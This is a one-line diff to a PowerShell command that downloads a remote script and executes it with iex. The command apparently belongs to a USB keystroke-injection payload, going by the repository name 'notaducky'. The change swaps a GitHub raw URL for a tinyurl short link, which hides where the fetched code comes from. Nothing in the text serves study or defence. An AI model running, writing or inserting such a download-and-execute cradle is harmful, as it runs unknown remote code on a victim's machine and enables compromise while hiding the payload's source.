@@ -1,1 +1,1 @@
-powershell /c iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/GreenLab-Studios/notaducky/main/dacommand.ps1")
+powershell -Command "iex (New-Object Net.WebClient).DownloadString(\"https://tinyurl.com/dacmduw\")"
